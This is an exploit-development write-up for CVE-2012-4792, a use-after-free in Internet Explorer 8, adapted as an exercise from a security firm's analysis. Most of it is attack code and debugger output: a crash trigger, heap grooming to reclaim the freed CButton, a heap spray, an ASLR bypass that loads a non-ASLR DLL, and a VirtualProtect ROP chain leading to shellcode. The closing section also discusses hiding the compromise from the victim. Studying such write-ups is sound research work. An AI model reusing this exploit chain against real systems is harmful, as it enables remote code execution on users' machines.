# Internet Explorer 8 CVE-2012-4792 - Use After Free triggered by CButton
Adopted from [Exodus Intel's blog post](http://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/)

## Steps
### Trigger
The following code triggers the crash:
```html
<html>
  <head>
    <script>
    function trigger() {
      tForm = document.getElementById("form");
      tDiv = document.getElementById("div");

      tDiv.appendChild(document.createElement('button')); // Add a CButton to the div
      tDiv.firstChild.applyElement(tForm);				  // Set CButton's parent to be the form

      tDiv.innerHTML = "";								  // Removes CButton from the div (form still references CButton)
      tDiv.appendChild(document.createElement('body'));   // Adds body to div
      CollectGarbage();									  // Collecting garbage frees the CButton
    }
    </script>
  </head>
  <body onload="eval(triggers())">
    <div id="div">
    </div>
    <form id="form">
    </form>
  </body>
</html>
```
The crash occurs when when the html body is loaded, `mshtml!CMarkup::OnLoadStatusDone` gets called where it will then attempt to reference the CButton which was previously freed with the `CollectGarbage()`

A heap trace of this crash shows that the object being referenced is indeed a CButton:

```
(a0.3c0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=05682fa8 ebx=04db8f28 ecx=00000052 edx=00000000 esi=00000000 edi=05682fa8
eip=3d08625c esp=0336d7a0 ebp=0336d80c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
mshtml!CMarkup::OnLoadStatusDone+0x4ef:
3d08625c 8b07            mov     eax,dword ptr [edi]  ds:0023:05682fa8=????????
1:022> !heap -p -a edi
    address 05682fa8 found in
    _DPH_HEAP_ROOT @ 151000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    5640eb0:          5682000             2000
    7c91a1ba ntdll!RtlFreeHeap+0x000000f9
    3d2b4b10 mshtml!CButton::`vector deleting destructor'+0x0000002f
    3cfa0ad9 mshtml!CBase::SubRelease+0x00000022
    3cf7e76d mshtml!CElement::PrivateRelease+0x00000029
    3cf7a976 mshtml!PlainRelease+0x00000025
    3cf9709c mshtml!PlainTrackerRelease+0x00000014
    3d7b5194 jscript!VAR::Clear+0x0000005c
    3d7b55b9 jscript!GcContext::Reclaim+0x000000ab
    3d7b4d08 jscript!GcContext::CollectCore+0x00000113
    3d82471d jscript!JsCollectGarbage+0x0000001d
    3d7c4aac jscript!NameTbl::InvokeInternal+0x00000137
    3d7c28c5 jscript!VAR::InvokeByDispID+0x0000017c
    3d7c4f93 jscript!CScriptRuntime::Run+0x00002abe
    3d7c13ab jscript!ScrFncObj::CallWithFrameOnStack+0x000000ff
    3d7c12e5 jscript!ScrFncObj::Call+0x0000008f
    3d7c1113 jscript!CSession::Execute+0x00000175


1:022> kv
ChildEBP RetAddr  Args to Child
0336d80c 3cee3e45 04f38fc0 04df06bc 04df06a8 mshtml!CMarkup::OnLoadStatusDone+0x4ef
0336d82c 3cee3e21 00000004 0336dcb4 00000001 mshtml!CMarkup::OnLoadStatus+0x47
0336dc78 3cf50aef 04f3af48 00000000 00000000 mshtml!CProgSink::DoUpdate+0x52f
0336dc8c 3cf8a7e9 04f3af48 04f3af48 04d9cd58 mshtml!CProgSink::OnMethodCall+0x12
0336dcc0 3cf75488 0336dd48 3cf753da 00000000 mshtml!GlobalWndOnMethodCall+0xfb
0336dce0 7e418734 0007025e 00000009 00000000 mshtml!GlobalWndProc+0x183
0336dd0c 7e418816 3cf753da 0007025e 00008002 USER32!InternalCallWinProc+0x28
0336dd74 7e4189cd 00000000 3cf753da 0007025e USER32!UserCallWinProcCheckWow+0x150 (FPO: [Non-Fpo])
0336ddd4 7e418a10 0336de08 00000000 0336feec USER32!DispatchMessageWorker+0x306 (FPO: [Non-Fpo])
0336dde4 3e2ec1d5 0336de08 00000000 01f9cf58 USER32!DispatchMessageW+0xf (FPO: [Non-Fpo])
0336feec 3e2932ee 030ecfe0 01000002 03070ff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x54c (FPO: [Non-Fpo])
0336ffa4 3e136f69 01f9cf58 0015476c 0336ffec IEFRAME!LCIETab_ThreadProc+0x2c1 (FPO: [Non-Fpo])
0336ffb4 7c80b729 03070ff0 01000002 0015476c iertutil!CIsoScope::RegisterThread+0xab (FPO: [Non-Fpo])
0336ffec 00000000 3e136f5b 03070ff0 00000000 kernel32!BaseThreadStart+0x37 (FPO: [Non-Fpo])
```

Looking at the code around the crash we see that `CElement::FindDefaultElem` is being called and what it returns (the CButton in our case) is being used to call a function pointer located at `[eax+0DCh]`:
![mshtml.dll](http://i.imgur.com/9bwPgxo.png)

The [Exodus Intel blog](http://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/) explains this vulnerability to exist as: "the CElement::SetDefaultElem ‘forgets’ to call AddRef on an object before it adds a reference to the object to the main CDoc object. As such the object can be freed by removing all other references to the object and will still be accessible through the Default Element reference in the CDoc object."

### Gaining EIP Control
Since this is a use after free vulnerability, to exploit this you have to replace the object that is expected to be at the CButton's heap block. This is achieved by first determining the size of the CButton heap block then allocating an equally sized block on the heap by creating a new string. This will cause the heap allocator to look through its freed blocks for a place to allocate the string and once it finds a block that has enough room to allocate our block it will place our string there. Since `OnLoadStatusDone` does a dereference of the CButton object located in edi:
```assembly
74DCCC36 mov eax, [edi]
```
We have to fill our string with a predictable address that contains user controlled data. This can be achieved through either an information leak or heap spray. For this exploit, I chose to use a heap spray for its simpilicity, however since the amount of data sprayed is quite large, this exploit might not perform as well on victims with computers that do not have much processing power. Please see below for how to heap spray was achieved. 

In the exploit this is achieved with the following lines (buttonSize was determined to be 0x58 and heapBlock = 0x07d00000):
```javascript
function trigger() {
    string = createString(pack([heapBlock + 0x24]), buttonSize);
    ...code...
    tDiv.className = string.substr(0);					// Allocate an object that is the same size
}
```

In order to ensure that our string object actually replaces the freed CButton and not some other heap block that happened to be of the same size, a low fragmented heap was created by iteratively creating CButton objects at the beginning of the exploit to fill in any gaps in the heap of size 0x58:
```javascript
function lfh(elType) {
    CollectGarbage();
    for (var i = 0; i < 20; i++) {
        document.createElement(elType); 
    }
}
...
lfh("button");
```

Since IE will align 1MB heap blocks with addresses sequentially incremented by 0x100000, an address that is predictable becomes a trival task as you simply have to spray the heap with 1MB blocks repeatedly until a range of addresses appear frequently enough to chose an address that most likely will contain our crafted heap block:
```javascript
function heapspray(payload) {
    var str = "\u4141";
    var base = payload;

    while ( base.length < ( 64*512 ) )
        base += str;

    sixtyFourKB = base.substr(0, 64*512);

    var mbBlock = "";
    var headerSize = 0x34/2;

    var count = 0;
    while (count++ < 15) {
        mbBlock += sixtyFourKB;
    }

    mbBlock += sixtyFourKB.substr(0, sixtyFourKB.length - headerSize);

    count = 0;
    while (count++ < 100) {
        heapBlocks[count] = mbBlock.substr(0, mbBlock.length);
    }
}
```

Once we have the program referencing our heap block, if we recall the source of our crash: `call dword ptr [eax+0DCh]`, in order to gain EIP control we need to now have our heapblock to contain an address to exectuable code at the 0xDC offset(DEP is enabled disallowing us to directly jump into our shellcode, however with the heap spray our shellcode is also at a predictable address). Since ASLR is enabled on most included dlls, without an information leak, we will be unable to actually jump to any address unless we have a dll that does not have ASLR enabled. For this I chose to have mscoreie.dll included on the page by included a dll on the page that requires mscoreie.dll to also be included on the page.
```html
<object style="display:none" classid="defeatASLR.dll#Foo"></object>
```
Depending on the user's security settings they may be prompted to either allow or disallow page elements such as this which could take away from the effectiveness of this exploit. Again an information leak would make this exploit more effective, however exploit of this bug would also be a more intensive exercise.

### ROP Chain
In order to execute shellcode, a call to virtual protect is required to make our heap block executable. This is achieved by using a stack pivot to cause our heap block to essentially become the stack allowing us to have complete control flow execution of the program:
```javascript
function sprayROPChain() {
    var ropChain = pack([
        virtualProtect, 	// VirtualProtect
        heapBlock,			// Heap block to make exec
        0xffff,				// How many bytes to make exec
        0x40,				// Exec specifier
        heapBlock + 0x4000,	// Garbage addr
        heapBlock,			// Garbage addr
        heapBlock + 0x128	// Shellcode address
    ]);

    var payload =  "\ubabe\ucafe" + ropChain;
        // stack pivot gets called with "call [eax + 0xdc]"
        payload += createString("\udead", call1Offset - (payload.length * 2) + 2);
        payload += pack([stackPivot]);

        // "add esp, 8" gets called with "call [eax + 0x100]"
        payload += createString("\ubeef", call2Offset - (payload.length * 2) + 2);
        payload += pack([addESP]);

        // shellcode to be executed once VirtualProtect makes heap block
        // executable
        payload += shellcode;

    heapspray(payload);
}
```

The shellcode included in the exploit simply causes the Windows calculator to open, demonstrating arbitrary code execution.

### Refinement
There are number of problems with this exploit. As I had mentioned throughout this writeup, an information leak would make this exploit a lot cleaner and less noisy. The code execution should also be more refined to spawn a threaded child process from the browser so the behavior of the browser to the victim appears to not have changed. 

### Credit
This was meant as an exercise based on the work done by [Exodus Intel](http://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/)
